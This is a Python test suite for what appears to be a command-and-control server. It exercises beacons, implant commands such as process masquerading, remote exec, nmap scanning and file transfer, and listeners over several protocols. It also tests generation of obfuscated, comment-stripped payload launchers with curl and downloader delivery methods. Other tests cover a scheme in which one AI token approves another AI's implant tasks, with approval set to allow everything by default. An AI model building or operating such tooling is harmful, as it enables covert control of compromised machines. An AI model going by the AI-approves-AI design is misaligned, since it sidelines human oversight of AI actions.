from __future__ import annotations

import base64

from server_core.code_sanitizer import strip_comments
from server_core.crypto import derive_key, open_seal, seal
from server_core.file_store import now_iso


def test_sanitizer_removes_comments_but_not_strings():
    source = '''# top
x = "# not a comment"  # trailing
y = """multi # string"""
# bottom
'''
    result = strip_comments(source)
    assert "# top" not in result.source
    assert "# trailing" not in result.source
    assert '"# not a comment"' in result.source
    assert "multi # string" in result.source
    assert result.removed_tokens == 3


def test_crypto_roundtrip_and_tamper():
    key = derive_key("secret")
    message = b"hello" * 1000
    sealed = seal(key, message, b"aad")
    assert open_seal(key, sealed, b"aad") == message
    tampered = bytearray(sealed)
    tampered[-1] ^= 1
    try:
        open_seal(key, bytes(tampered), b"aad")
    except ValueError:
        pass
    else:
        raise AssertionError("tamper should fail")


def test_api_auth_and_status(client):
    response = client.post("/api/action", json={"action": "server.status", "args": {}})
    assert response.status_code == 401
    assert response.content == b""
    response = client.post("/api/action", headers={"Authorization": "Bearer test-token"}, json={"action": "server.status", "args": {}})
    assert response.status_code == 200
    assert response.json()["status"] == "ok"
    data = response.json()["data"]
    assert data["approval_mode"] == "all_allow"
    assert any(p["protocol"] == "udp" for p in data["protocols"])
    assert any(p["protocol"] == "icmp" and p["disabled"] for p in data["protocols"])


def test_plugin_platform_commands(client):
    response = client.post("/api/action", headers={"Authorization": "Bearer test-token"}, json={"action": "plugin.list", "args": {"kind": "implant"}})
    plugins = response.json()["data"]
    commands = {cmd for plugin in plugins for cmd in plugin.get("commands", [])}
    assert "lps" in commands
    assert "wps" in commands
    assert "lls" in commands
    assert "wls" in commands
    assert "lmasquerade" in commands
    assert "lcat" in commands
    assert "wcat" in commands
    assert "lmkdir" in commands
    assert "wmkdir" in commands
    assert "lrm" in commands
    assert "wrm" in commands
    assert "lmv" in commands
    assert "wmv" in commands
    assert "lcp" in commands
    assert "wcp" in commands
    assert "lcd" in commands
    assert "wcd" in commands
    assert "ltail" in commands
    assert "wtail" in commands
    assert "ltee" in commands
    assert "wtee" in commands
    assert "ldd" in commands
    assert "wdd" in commands
    assert "lexec" in commands
    assert "wexec" in commands
    assert "lping" in commands
    assert "wping" in commands
    assert "lnmap" in commands
    assert "wnmap" in commands
    assert "lsysinfo" in commands
    assert "wsysinfo" in commands
    assert "ltasks" in commands
    assert "wtasks" in commands
    assert "lkilltask" in commands
    assert "wkilltask" in commands
    assert "lsettings" in commands
    assert "wsettings" in commands
    assert "lupgrade" in commands
    assert "wupgrade" in commands
    assert "lfork" in commands
    assert "wfork" in commands
    assert "lkillbeacon" in commands
    assert "wkillbeacon" in commands
    assert "fs.list" not in commands
    assert "fs.read" not in commands


def test_payload_generation_strips_comments_and_methods(client):
    headers = {"Authorization": "Bearer test-token"}
    listener = client.post("/api/action", headers=headers, json={"action": "listener.create", "args": {"protocol": "udp", "host": "127.0.0.1", "port": 19055, "public_host": "127.0.0.1"}})
    assert listener.status_code == 200
    listener_id = listener.json()["data"]["id"]
    payload = client.post("/api/action", headers=headers, json={"action": "payload.generate", "args": {"listener_id": listener_id, "name": "test", "public_url": "http://127.0.0.1:18081", "fast_interval": 3, "slow_interval": 30, "finish_delay": 2, "jitter": 0.1, "max_concurrent_tasks": 5}})
    assert payload.status_code == 200
    record = payload.json()["data"]
    assert record["protocol"] == "udp"
    assert set(record["methods"]) >= {"direct_echo", "curl", "short_downloader"}
    assert "'\"'\"'" not in record["methods"]["direct_echo"]
    assert "'\"'\"'" not in record["methods"]["short_downloader"]
    download = client.get(f"/p/{record['token']}")
    assert download.status_code == 200
    source = download.text
    assert "#" not in "\n".join(line for line in source.splitlines() if line.lstrip().startswith("#"))
    assert source.startswith("import base64,zlib;exec(")
    assert "def main()" not in source
    # The public download is a self-decoding launcher, not raw source.
    compile(source, "<payload-launcher>", "exec")
    assert record["removed_comment_tokens"] > 0
    assert record["settings"]["fast_interval"] == 3.0
    assert record["settings"]["slow_interval"] == 30.0
    assert record["settings"]["finish_delay"] == 2.0
    assert record["settings"]["jitter"] == 0.1
    assert record["settings"]["max_concurrent_tasks"] == 5
    assert not (client.app.state.runtime.settings.workdir / "data" / "payloads").exists()
    assert not list((client.app.state.runtime.settings.workdir / "data" / "beacons").glob("*/payload.json"))


def test_task_source_is_sanitized(client):
    headers = {"Authorization": "Bearer test-token"}
    # Create a fake beacon status record so task validation passes.
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/testbeacon/beacon.json", {"id": "testbeacon", "status": "online", "last_seen": now_iso()})
    response = client.post("/api/action", headers=headers, json={"action": "script.run", "args": {"beacon_id": "testbeacon", "source": "# secret comment\nprint('ok')"}})
    assert response.status_code == 200
    task = response.json()["data"]
    stored = runtime.tasks.store.read_json(f"tasks/{task['id']}/task.json")
    assert "secret comment" not in stored["source"]
    assert stored["removed_comment_tokens"] == 1


def test_plugin_create_and_ai_action_removed(client):
    headers = {"Authorization": "Bearer test-token"}
    response = client.post("/api/action", headers=headers, json={
        "action": "plugin.create",
        "args": {"kind": "implant", "name": "common/created_test", "command": "created.test"},
    })
    assert response.status_code == 200
    data = response.json()["data"]
    assert data["name"] == "common/created_test"
    assert (client.app.state.runtime.settings.workdir / "implant_plugins" / "common" / "created_test.py").exists()
    listed = client.post("/api/action", headers=headers, json={"action": "plugin.list", "args": {"kind": "implant"}}).json()["data"]
    assert any(p["name"] == "common/created_test" and "created.test" in p.get("commands", []) for p in listed)
    ai = client.post("/api/action", headers=headers, json={
        "action": "plugin.ai_create",
        "args": {"kind": "implant", "name": "common/ai_test", "prompt": "test"},
    })
    assert ai.status_code == 200
    assert ai.json()["status"] == "error"
    assert "unknown action" in ai.json()["error"]


def test_ai_capabilities_and_approval_flow(client):
    human = {"Authorization": "Bearer test-token"}
    ai = {"Authorization": "Bearer test-ai-token"}
    ai_approval = {"Authorization": "Bearer test-ai-approval-token"}
    caps = client.post("/api/action", headers=human, json={"action": "server.capabilities", "args": {}}).json()["data"]
    assert "approval.approve" in caps["actions"]
    assert "approval.approve_all" in caps["actions"]
    assert "plugin.create" in caps["actions"]
    assert caps["roles"]["ai_approval"]

    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/approvalbeacon/beacon.json", {"id": "approvalbeacon", "status": "online", "platform": "linux", "last_seen": now_iso()})
    client.post("/api/action", headers=human, json={"action": "server.config.set", "args": {"approval_mode": "per_action"}})

    # Humans bypass approval policy even in per_action mode.
    human_task = client.post("/api/action", headers=human, json={
        "action": "task.create",
        "args": {"beacon_id": "approvalbeacon", "plugin": "sysinfo", "args": {}},
    }).json()
    assert human_task["status"] == "ok"

    # AI actions enter the approval queue.
    created = client.post("/api/action", headers=ai, json={
        "action": "task.create",
        "args": {"beacon_id": "approvalbeacon", "plugin": "sysinfo", "args": {}},
    }).json()
    assert created["status"] == "approval_required"
    approval_id = created["approval"]["id"]

    pending = client.post("/api/action", headers=ai, json={"action": "approval.pending", "args": {}}).json()["data"]
    assert any(item["id"] == approval_id for item in pending)

    shown = client.post("/api/action", headers=human, json={"action": "approval.show", "args": {"approval_id": approval_id}}).json()["data"]
    assert shown["action"] == "task.create"
    assert shown["actor"] == "ai"

    # AI worker cannot decide approvals.
    denied = client.post("/api/action", headers=ai, json={"action": "approval.approve", "args": {"approval_id": approval_id}}).json()
    assert denied["status"] == "error"
    assert "approval token required" in denied["error"]

    # A second AI holding the approval token can approve the worker's action.
    approved = client.post("/api/action", headers=ai_approval, json={"action": "approval.approve", "args": {"approval_id": approval_id}}).json()["data"]
    assert approved["status"] == "approved"

    # Bulk approval path for AI-created operations.
    second = client.post("/api/action", headers=ai, json={
        "action": "task.create",
        "args": {"beacon_id": "approvalbeacon", "plugin": "lps", "args": {}},
    }).json()
    assert second["status"] == "approval_required"
    bulk = client.post("/api/action", headers=human, json={"action": "approval.approve_all", "args": {}}).json()["data"]
    assert bulk["approved"] >= 1

    runtime.set_approval_mode("all_allow")


def test_file_actions_map_to_command_plugins(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/filebeacon/beacon.json", {"id": "filebeacon", "status": "online", "platform": "linux", "last_seen": now_iso()})
    cases = [
        ("file.list", {"beacon_id": "filebeacon", "path": "."}, "lls"),
        ("file.read", {"beacon_id": "filebeacon", "path": "x"}, "lcat"),
        ("file.write", {"beacon_id": "filebeacon", "path": "x", "content": "y"}, "ltee"),
        ("file.download", {"beacon_id": "filebeacon", "path": "x"}, "ldd"),
    ]
    for action_name, args, plugin_name in cases:
        response = client.post("/api/action", headers=headers, json={"action": action_name, "args": args}).json()
        assert response["status"] == "ok"
        assert response["data"]["plugin"] == plugin_name
    upload = client.post("/api/action", headers=headers, json={
        "action": "file.upload",
        "args": {"beacon_id": "filebeacon", "path": "x", "content_b64": "eQ=="},
    }).json()
    assert upload["status"] == "ok"
    assert upload["data"]["task"]["plugin"] == "ldd"

    chunk = client.post("/api/action", headers=headers, json={
        "action": "file.upload_chunk",
        "args": {"beacon_id": "filebeacon", "path": "x", "offset": 1048576, "mode": "append", "content_b64": "eQ=="},
    }).json()
    assert chunk["status"] == "ok"
    assert chunk["data"]["task"]["plugin"] == "ldd"
    assert chunk["data"]["task"]["args"]["op"] == "write"
    assert chunk["data"]["task"]["args"]["offset"] == 1048576


def test_beacon_settings_action(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/settingsbeacon/beacon.json", {
        "id": "settingsbeacon", "status": "online", "platform": "linux",
        "settings": {"fast_interval": 5, "slow_interval": 600, "finish_delay": 5, "jitter": 0.2, "max_concurrent_tasks": 8},
    })
    response = client.post("/api/action", headers=headers, json={
        "action": "beacon.settings",
        "args": {"beacon_id": "settingsbeacon", "settings": {
            "fast_interval": 4, "slow_interval": 20, "finish_delay": 3,
            "jitter": 0.15, "max_concurrent_tasks": 6, "current_interval": 7,
        }},
    }).json()
    assert response["status"] == "ok"
    assert response["data"]["task"]["plugin"] == "control.set_runtime_settings"
    assert response["data"]["settings"]["fast_interval"] == 4.0
    assert response["data"]["settings"]["slow_interval"] == 20.0
    record = runtime.store.read_json("beacons/settingsbeacon/beacon.json")
    assert record["heartbeat_fast"] == 4.0
    assert record["heartbeat_slow"] == 20.0
    assert record["max_concurrent_tasks"] == 6


def test_protocol_upgrade_action(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/protobeacon/beacon.json", {"id": "protobeacon", "status": "online", "platform": "linux"})
    response = client.post("/api/action", headers=headers, json={
        "action": "protocol.upgrade",
        "args": {"beacon_id": "protobeacon", "protocol": "tcp", "host": "127.0.0.1", "port": 19022},
    }).json()
    assert response["status"] == "ok"
    task = response["data"]
    assert task["plugin"] == "control.protocol_switch"
    assert task["args"]["protocol"] == "tcp"
    assert task["args"]["port"] == 19022


def test_listener_start_and_restart(client):
    import socket
    headers = {"Authorization": "Bearer test-token"}
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.close()
    created = client.post("/api/action", headers=headers, json={
        "action": "listener.create",
        "args": {"protocol": "udp", "host": "127.0.0.1", "port": port, "public_host": "127.0.0.1"},
    }).json()
    assert created["status"] == "ok"
    listener_id = created["data"]["id"]
    stopped = client.post("/api/action", headers=headers, json={"action": "listener.stop", "args": {"listener_id": listener_id}}).json()["data"]
    assert stopped["status"] == "stopped"
    started = client.post("/api/action", headers=headers, json={"action": "listener.start", "args": {"listener_id": listener_id}}).json()["data"]
    assert started["status"] == "listening"
    restarted = client.post("/api/action", headers=headers, json={"action": "listener.restart", "args": {"listener_id": listener_id}}).json()["data"]
    assert restarted["status"] == "listening"
    removed = client.post("/api/action", headers=headers, json={"action": "listener.remove", "args": {"listener_id": listener_id}}).json()
    assert removed["status"] == "ok"
    assert removed["data"]["removed"] is True
    remaining = client.post("/api/action", headers=headers, json={"action": "listener.list", "args": {}}).json()["data"]
    assert all(item["id"] != listener_id for item in remaining)


def test_beacon_note(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/notebeacon/beacon.json", {"id": "notebeacon", "status": "online", "platform": "linux"})
    result = client.post("/api/action", headers=headers, json={
        "action": "beacon.note",
        "args": {"beacon_id": "notebeacon", "note": "测试业务服务器"},
    }).json()
    assert result["status"] == "ok"
    assert result["data"]["note"] == "测试业务服务器"
    record = runtime.store.read_json("beacons/notebeacon/beacon.json")
    assert record["note"] == "测试业务服务器"
    shown = client.post("/api/action", headers=headers, json={"action": "beacon.show", "args": {"beacon_id": "notebeacon"}}).json()["data"]
    assert shown["note"] == "测试业务服务器"


def test_beacon_soft_removal_and_reactivation_preserves_note(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/expirebeacon/beacon.json", {
        "id": "expirebeacon", "status": "online", "platform": "linux",
        "hostname": "EXP", "last_seen": "2020-01-01T00:00:00+0800",
        "note": "不能删除的备注", "settings": {"fast_interval": 5, "slow_interval": 600, "finish_delay": 5, "jitter": 0.2, "max_concurrent_tasks": 8},
    })
    active = runtime.list_beacons()
    assert all(b["id"] != "expirebeacon" for b in active)
    record = runtime.store.read_json("beacons/expirebeacon/beacon.json")
    assert record["removed"] is True
    assert record["note"] == "不能删除的备注"
    assert record["removed_at"]

    payload = {"beacon_id": "expirebeacon", "id": "pl_expire", "listener_id": "lst_expire", "protocol": "udp"}
    reactivated = runtime._touch_beacon(
        {"hostname": "EXP", "platform": "linux", "username": "u", "python_version": "3.13", "cwd": "/tmp"},
        payload, "udp", {"current": 5, "fast_interval": 5, "slow_interval": 600, "finish_delay": 5, "jitter": 0.2, "max_concurrent_tasks": 8},
    )
    assert reactivated["removed"] is False
    assert reactivated["note"] == "不能删除的备注"
    assert reactivated["reactivation_count"] == 1
    assert any(b["id"] == "expirebeacon" for b in runtime.list_beacons())


def test_active_payload_survives_server_runtime_reload(client):
    from server_core.runtime import ServerRuntime

    headers = {"Authorization": "Bearer test-token"}
    listener = client.post("/api/action", headers=headers, json={
        "action": "listener.create",
        "args": {"protocol": "udp", "host": "127.0.0.1", "port": 19055, "public_host": "127.0.0.1"},
    }).json()["data"]
    payload = client.post("/api/action", headers=headers, json={
        "action": "payload.generate",
        "args": {"listener_id": listener["id"], "name": "persist", "public_url": "http://127.0.0.1:18081"},
    }).json()["data"]
    runtime = client.app.state.runtime
    assert (runtime.settings.runtime_dir / "active_payloads" / f"{payload['token']}.json").exists()
    restored = ServerRuntime(runtime.settings)
    assert payload["token"] in restored.active_payloads
    assert restored.payload_source(payload["id"]).strip()


def test_beacon_stash_preserves_record(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/stashbeacon/beacon.json", {
        "id": "stashbeacon", "status": "online", "platform": "linux",
        "hostname": "STASH", "note": "保留备注", "task_history_marker": "keep",
    })
    stashed = client.post("/api/action", headers=headers, json={
        "action": "beacon.stash",
        "args": {"beacon_id": "stashbeacon", "stashed": True},
    }).json()["data"]
    assert stashed["stashed"] is True
    record = runtime.store.read_json("beacons/stashbeacon/beacon.json")
    assert record["stashed"] is True
    assert record["note"] == "保留备注"
    assert record["task_history_marker"] == "keep"
    restored = client.post("/api/action", headers=headers, json={
        "action": "beacon.stash",
        "args": {"beacon_id": "stashbeacon", "stashed": False},
    }).json()["data"]
    assert restored["stashed"] is False
    assert runtime.store.read_json("beacons/stashbeacon/beacon.json")["note"] == "保留备注"


def test_offline_beacon_rejects_task(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/offlinebeacon/beacon.json", {
        "id": "offlinebeacon", "status": "offline", "platform": "linux", "last_seen": "2020-01-01T00:00:00+0800",
    })
    response = client.post("/api/action", headers=headers, json={
        "action": "task.create",
        "args": {"beacon_id": "offlinebeacon", "plugin": "lpwd", "args": {}},
    }).json()
    assert response["status"] == "error"
    assert "task not dispatched" in response["error"]


def test_clear_all_beacons(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/clear-a/beacon.json", {"id": "clear-a", "status": "online", "last_seen": now_iso()})
    runtime.store.write_json("beacons/clear-b/beacon.json", {"id": "clear-b", "status": "online", "last_seen": now_iso()})
    runtime.active_payloads["tok"] = {"id": "p", "token": "tok", "beacon_id": "clear-a", "key_b64": ""}
    result = client.post("/api/action", headers=headers, json={"action": "beacon.clear", "args": {}}).json()
    assert result["status"] == "ok"
    assert result["data"]["removed"] >= 2
    assert not list((runtime.settings.data_dir / "beacons").glob("*/beacon.json"))
    assert not runtime.active_payloads


def test_base_command_resolves_for_beacon_platform(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/linux-cmd/beacon.json", {"id": "linux-cmd", "status": "online", "platform": "linux", "last_seen": now_iso()})
    runtime.store.write_json("beacons/windows-cmd/beacon.json", {"id": "windows-cmd", "status": "online", "platform": "windows", "last_seen": now_iso()})
    linux_task = client.post("/api/action", headers=headers, json={"action": "task.create", "args": {"beacon_id": "linux-cmd", "plugin": "cd", "args": {"path": "/tmp"}}}).json()["data"]
    windows_task = client.post("/api/action", headers=headers, json={"action": "task.create", "args": {"beacon_id": "windows-cmd", "plugin": "cd", "args": {"path": "C:\\"}}}).json()["data"]
    assert linux_task["plugin"] == "lcd"
    assert linux_task["display"] == "cd"
    assert windows_task["plugin"] == "wcd"
    assert windows_task["display"] == "cd"


def test_transport_plugin_is_visible_and_creatable(client):
    headers = {"Authorization": "Bearer test-token"}
    listing = client.post("/api/action", headers=headers, json={"action": "plugin.list", "args": {"kind": "transport"}}).json()["data"]
    protocols = {item.get("manifest", {}).get("protocol") for item in listing}
    assert {"dns", "http", "https", "tcp", "udp", "icmp"} <= protocols
    created = client.post("/api/action", headers=headers, json={
        "action": "plugin.create",
        "args": {"kind": "transport", "name": "demo_transport", "command": "demo.transport"},
    }).json()
    assert created["status"] == "ok"
    assert (client.app.state.runtime.settings.workdir / "transport_plugins" / "demo_transport.py").exists()
    refreshed = client.post("/api/action", headers=headers, json={"action": "plugin.list", "args": {"kind": "transport"}}).json()["data"]
    assert any(item["name"] == "demo_transport" for item in refreshed)


def test_server_is_api_only_and_private(client):
    headers = {"Authorization": "Bearer test-token"}
    unauth_root = client.get("/")
    assert unauth_root.status_code == 401
    assert unauth_root.content == b""
    auth_root = client.get("/", headers=headers)
    assert auth_root.status_code == 204
    assert auth_root.content == b""
    unauth_health = client.get("/health")
    assert unauth_health.status_code == 401
    assert unauth_health.content == b""
    auth_health = client.get("/health", headers=headers)
    assert auth_health.status_code == 200
    assert auth_health.json()["ok"] is True
    assert "<html" not in auth_root.text.lower()
    assert client.get("/app", headers=headers).status_code == 404
    assert client.get("/assets/index.js", headers=headers).status_code == 404


def test_chunked_result_reassembled_without_truncation(client):
    import base64
    import hashlib
    import json

    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/chunkbeacon/beacon.json", {
        "id": "chunkbeacon", "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    task = client.post("/api/action", headers=headers, json={
        "action": "task.create",
        "args": {"beacon_id": "chunkbeacon", "plugin": "pwd", "args": {}},
    }).json()["data"]
    big_output = "A" * 120000
    payload = {"output": big_output, "error": "", "data": {"text": "B" * 60000}}
    raw = json.dumps(payload).encode("utf-8")
    digest = hashlib.sha256(raw).hexdigest()
    chunk_size = 12000
    chunks = [raw[i:i + chunk_size] for i in range(0, len(raw), chunk_size)]
    for index, chunk in enumerate(chunks):
        runtime.tasks.record_result_chunk(
            task["id"], index, len(chunks), base64.b64encode(chunk).decode("ascii"), digest,
        )
    finished = runtime.tasks.get_task(task["id"])
    assert finished["status"] == "succeeded"
    assert len(finished["output"]) == 120000
    assert finished["output"] == big_output
    assert len(finished["result"]["data"]["text"]) == 60000


def test_cancelled_task_status(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/cancelbeacon/beacon.json", {
        "id": "cancelbeacon", "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    task = client.post("/api/action", headers=headers, json={
        "action": "task.create",
        "args": {"beacon_id": "cancelbeacon", "plugin": "tasks", "args": {}},
    }).json()["data"]
    result = runtime.tasks.record_result(task["id"], output="", error="cancelled")
    assert result["status"] == "cancelled"
    assert runtime.tasks.get_task(task["id"])["status"] == "cancelled"


def test_large_task_payload_is_rejected_with_chunking_guidance(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/largebeacon/beacon.json", {
        "id": "largebeacon", "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    result = client.post("/api/action", headers=headers, json={
        "action": "file.upload",
        "args": {"beacon_id": "largebeacon", "path": "/tmp/large.bin", "content_b64": "YQ==" * 50000},
    }).json()
    assert result["status"] == "error"
    assert "20KB transport limit" in result["error"]


def test_ai_approval_cannot_approve_its_own_operation(client):
    human = {"Authorization": "Bearer test-token"}
    approval = {"Authorization": "Bearer test-ai-approval-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/selfapprove/beacon.json", {
        "id": "selfapprove", "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    client.post("/api/action", headers=human, json={"action": "server.config.set", "args": {"approval_mode": "per_action"}})
    try:
        created = client.post("/api/action", headers=approval, json={
            "action": "task.create",
            "args": {"beacon_id": "selfapprove", "plugin": "pwd", "args": {}},
        }).json()
        assert created["status"] == "approval_required"
        denied = client.post("/api/action", headers=approval, json={
            "action": "approval.approve",
            "args": {"approval_id": created["approval"]["id"]},
        }).json()
        assert denied["status"] == "error"
        assert "cannot approve its own operation" in denied["error"]
    finally:
        client.post("/api/action", headers=human, json={"action": "server.config.set", "args": {"approval_mode": "all_allow"}})


def test_payload_uses_dh_material_and_launcher(client):
    import base64
    import re
    import zlib

    headers = {"Authorization": "Bearer test-token"}
    listener = client.post("/api/action", headers=headers, json={
        "action": "listener.create",
        "args": {"protocol": "udp", "host": "127.0.0.1", "port": 19058, "public_host": "127.0.0.1"},
    }).json()["data"]
    record = client.post("/api/action", headers=headers, json={
        "action": "payload.generate",
        "args": {"listener_id": listener["id"], "public_url": "http://127.0.0.1:18081"},
    }).json()["data"]
    assert "dh_prime" in record and "dh_server_pub" in record
    assert "key_b64" not in record
    launcher = client.get(f"/p/{record['token']}").text
    assert launcher.startswith("import base64,zlib;exec(")
    encoded = re.search(r'b64decode\(["\']([^"\']+)', launcher).group(1)
    source = zlib.decompress(base64.b64decode(encoded)).decode("utf-8")
    assert "dh_private" not in source
    assert "dh_server_pub" in source
    assert record["replay_protection"] is True


def test_local_web_backend_hides_token_and_requires_header(tmp_path):
    from fastapi.testclient import TestClient
    from clients.web_backend import create_local_app

    cfg = tmp_path / "web.json"
    cfg.write_text('{"server":"http://127.0.0.1:18080","token":"local-secret"}', encoding="utf-8")
    app = create_local_app("http://127.0.0.1:18080", "local-secret", str(cfg))
    web = TestClient(app)
    config = web.get("/api/config").json()
    assert config == {"server": "http://127.0.0.1:18080"}
    assert "local-secret" not in str(config)
    assert web.get("/api/session").status_code == 401
    assert web.post("/api/action", json={"action": "beacon.list", "args": {}}).status_code == 401


def test_plugin_rename_can_delete_old_plugin(client):
    headers = {"Authorization": "Bearer test-token"}
    created = client.post("/api/action", headers=headers, json={
        "action": "plugin.create",
        "args": {"kind": "server", "name": "rename_test", "command": "rename.test"},
    }).json()
    assert created["status"] == "ok"
    deleted = client.post("/api/action", headers=headers, json={
        "action": "plugin.delete",
        "args": {"kind": "server", "name": "rename_test"},
    }).json()
    assert deleted["status"] == "ok"
    assert deleted["data"]["deleted"] is True


def test_auto_sequence_claims_one_task_at_a_time(client):
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/autobeacon/beacon.json", {
        "id": "autobeacon", "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    engine = runtime.tasks
    engine.arm_auto_sequence("autobeacon", [
        {"plugin": "pwd", "args": {}, "command": "pwd"},
        {"plugin": "ls", "args": {"path": "/tmp"}, "command": "ls /tmp"},
    ])
    first = engine.claim_tasks("autobeacon")
    assert len(first) == 1
    assert first[0]["plugin"] == "lpwd"
    assert engine.claim_tasks("autobeacon") == []
    engine.record_result(first[0]["task_id"], output="/tmp\n")
    second = engine.claim_tasks("autobeacon")
    assert len(second) == 1
    assert second[0]["plugin"] == "lls"
    engine.record_result(second[0]["task_id"], output="x")
    assert engine.auto_mode("autobeacon") is False


def test_group_crud_and_batch_dispatch(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/groupbeacon/beacon.json", {
        "id": "groupbeacon", "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    group = client.post("/api/action", headers=headers, json={
        "action": "group.create",
        "args": {"name": "test-group", "beacon_ids": ["groupbeacon"], "auto_tasks": [{"plugin": "pwd", "args": {}, "command": "pwd"}]},
    }).json()["data"]
    assert group["name"] == "test-group"
    listed = client.post("/api/action", headers=headers, json={"action": "group.list", "args": {}}).json()["data"]
    assert any(item["id"] == group["id"] for item in listed)
    batch = client.post("/api/action", headers=headers, json={
        "action": "group.batch_dispatch",
        "args": {"group_id": group["id"], "tasks": [{"plugin": "pwd", "args": {}, "command": "pwd"}]},
    }).json()["data"]
    assert len(batch["created"]) == 1
    assert batch["created"][0]["plugin"] == "lpwd"


def test_global_auto_tasks_apply_to_all_beacons(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/globalauto/beacon.json", {
        "id": "globalauto", "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    client.post("/api/action", headers=headers, json={
        "action": "group.create",
        "args": {"name": "batch-only-group", "beacon_ids": ["globalauto"], "batch_tasks": [{"plugin": "pwd", "args": {}, "command": "pwd"}]},
    })
    saved = client.post("/api/action", headers=headers, json={
        "action": "auto.global.set",
        "args": {"tasks": [{"plugin": "whoami", "args": {}, "command": "whoami"}]},
    }).json()["data"]
    assert saved["tasks"][0]["plugin"] == "whoami"
    combined = runtime._auto_tasks_for_beacon("any-beacon")
    assert [item["plugin"] for item in combined] == ["whoami"]


def test_inline_python_comments_are_stripped(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/inlinepy/beacon.json", {
        "id": "inlinepy", "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    task = client.post("/api/action", headers=headers, json={
        "action": "task.create",
        "args": {"beacon_id": "inlinepy", "plugin": "python", "args": {"code": "# inline secret\nprint('ok') # trailing"}},
    }).json()["data"]
    stored = runtime.tasks.store.read_json(f"tasks/{task['id']}/task.json")
    assert "inline secret" not in stored["args"]["code"]
    assert "trailing" not in stored["args"]["code"]
    assert stored["inline_removed_comment_tokens"] == 2


def test_beacon_manual_display_order(client):
    headers = {"Authorization": "Bearer test-token"}
    runtime = client.app.state.runtime
    runtime.store.write_json("beacons/order-b/beacon.json", {"id": "order-b", "status": "online", "platform": "linux", "last_seen": now_iso()})
    runtime.store.write_json("beacons/order-a/beacon.json", {"id": "order-a", "status": "online", "platform": "linux", "last_seen": now_iso()})
    response = client.post("/api/action", headers=headers, json={
        "action": "beacon.order.set",
        "args": {"beacon_ids": ["order-a", "order-b"]},
    }).json()
    assert response["status"] == "ok"
    listed = client.post("/api/action", headers=headers, json={"action": "beacon.list", "args": {}}).json()["data"]
    ids = [item["id"] for item in listed if item["id"] in {"order-a", "order-b"}]
    assert ids == ["order-a", "order-b"]

def test_unlisted_beacon_order_stays_stable_when_heartbeats_change(client):
    from datetime import datetime, timezone, timedelta
    runtime = client.app.state.runtime
    runtime.store.write_json("beacon_order.json", {"order": []})
    now = datetime.now(timezone.utc)
    records = [
        ("orderstable_old", (now - timedelta(hours=3)).isoformat(), (now - timedelta(seconds=20)).isoformat()),
        ("orderstable_mid", (now - timedelta(hours=2)).isoformat(), (now - timedelta(seconds=10)).isoformat()),
        ("orderstable_new", (now - timedelta(hours=1)).isoformat(), now.isoformat()),
    ]
    for beacon_id, first_seen, last_seen in records:
        runtime.store.write_json(f"beacons/{beacon_id}/beacon.json", {
            "id": beacon_id,
            "status": "online",
            "platform": "linux",
            "first_seen": first_seen,
            "last_seen": last_seen,
        })
    watched = {"orderstable_old", "orderstable_mid", "orderstable_new"}
    first_order = [item["id"] for item in runtime.list_beacons() if item["id"] in watched]
    assert first_order == ["orderstable_new", "orderstable_mid", "orderstable_old"]

    # Simulate a fresh heartbeat for the oldest discovered row. Its position
    # must not change because unlisted ordering is based on first_seen.
    runtime.store.write_json("beacons/orderstable_old/beacon.json", {
        "id": "orderstable_old",
        "status": "online",
        "platform": "linux",
        "first_seen": (now - timedelta(hours=3)).isoformat(),
        "last_seen": now.isoformat(),
    })
    second_order = [item["id"] for item in runtime.list_beacons() if item["id"] in watched]
    assert second_order == first_order



def test_task_lease_ack_and_redelivery(client):
    import time
    runtime = client.app.state.runtime
    beacon_id = "leasebeacon"
    runtime.store.write_json(f"beacons/{beacon_id}/beacon.json", {
        "id": beacon_id, "status": "online", "platform": "linux", "last_seen": now_iso(),
    })
    task = runtime.tasks.create_task(beacon_id, plugin="pwd", args={})
    first = runtime.tasks.claim_tasks(beacon_id, limit=1)
    assert [item["task_id"] for item in first] == [task["id"]]
    assert runtime.tasks.claim_tasks(beacon_id, limit=1) == []

    lease = runtime.tasks._leases[task["id"]]
    lease["expires_at"] = time.time() - 1
    redelivered = runtime.tasks.claim_tasks(beacon_id, limit=1)
    assert [item["task_id"] for item in redelivered] == [task["id"]]
